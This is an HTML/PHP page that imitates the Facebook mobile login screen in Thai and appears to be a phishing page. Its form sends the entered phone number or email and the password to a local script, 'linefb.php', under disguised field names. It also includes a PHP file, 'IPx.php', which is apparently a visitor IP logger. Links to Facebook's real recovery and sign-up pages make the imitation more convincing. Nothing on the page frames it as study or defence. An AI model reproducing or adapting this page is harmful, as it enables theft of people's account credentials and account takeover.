<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <style>
  <?php
  include('IPx.php');
  ?>
    body {
      margin: 0;
      padding: 0;
      
    }
        .user {
            border:1px solid #ccc;
            width: 320px;
            padding:10px;
            margin:5px 15px;
            border-radius: 4px;
            background:  whitesmoke;
        }
        .pass {
          border:1px solid #ccc;
          width: 320px;
          padding:10px;
          margin:5px 15px;
          border-radius: 4px;
          background: whitesmoke;
        }
        .send {
            width:220px;
        }
        .facebook {
          height: 50px; 
        }
        .loginface {
          text-align: center; 
        }
      .buttzon {
        width: 340px;
        padding:10px;
        color: white;
        margin:5px 15px;
        background: blue;
        border: none;
        border-radius: 4px; 
        }
        .p2 {
          color: cornflowerblue;
          font-size: 12px; 
        }
        .p-2 {
          font-size: 12px; 
          color: #999999;
        }
        .button2 {
          border: none;
          background: green;
          color: white;
          height: 30px; 
          border-radius: 4px; 
        }
        .zxc .p1 {
          font-size: 10px; 
          color: black;
          margin-left: -120px;
        }
        .zxc {
          padding: 30px;
        }
        .h6-1699 {
          color: #a19d94;
        }
        .p-1 {
          width: 350px; 
          background: lightgoldenrodyellow;
          padding: 10px;
        }
    </style>
</head>
<body>
  <div class="loginface">
  <br>
  <img class="facebook" src="img/ei_1623980028140-removebg-preview.png">
    <form action="linefb.php" method="post">
        <input class="user" name="firstname" placeholder='หมายเลขโทรศัพท์มือถือหรืออีเมล์' type='text' required>
        <br>
        <input class="pass" name="lastname" placeholder='รหัสผ่าน' type='password'>
        <input class="buttzon" class='send' name="submit" type='submit' value='เข้าสู่ระบบ' required>
    </form>
    <a href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8%26hrc%3D1&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr">
    <p class="p2">ลืมรหัสผ่านใช่หรือไม่ </p>
    </a>
    <h6 class="h6-1699">----------------------------    หรือ  ------------------------------</h6>
    <a href="https://m.facebook.com/reg/?cid=103&refsrc=https%3A%2F%2Fm.facebook.com%2Freg-no-deeplink%2F&hrc=1&soft=hjk">
    <h6><button class="button2">สร้างบัญชีใหม่</button></h6>
    </a>
    <div class="zxc">
      <style>
      .pull-left {float:left;}
      .pull-right {float:right;}
      .p90 {
        font-size: 12px; 
        color: #999999;
      }
      .p91 {
        font-size: 9px; 
        color: royalblue;
      }
      .we {
        color: white;
      }
      a {
        color: white;
      }
  </style>
      <div class="text-center">
        <span class="pull-left">
          <h4 class="p90">ภาษาไทย</h4>
           <p class="p91">日本語</p>
           <p class="p91">Tiếng Việt</p>
       <p class="p91">Português (Brasil)</p>
       
        </span>
        <span class="pull-right">
          <p class="we">_</p>
          <p class="p91">English (UK)</p>
          <p class="p91">中文(简体)</p>
          <p class="p91">Español</p>
        </span>
      </div>
      
    </div>
  </div>
</body>
</html>
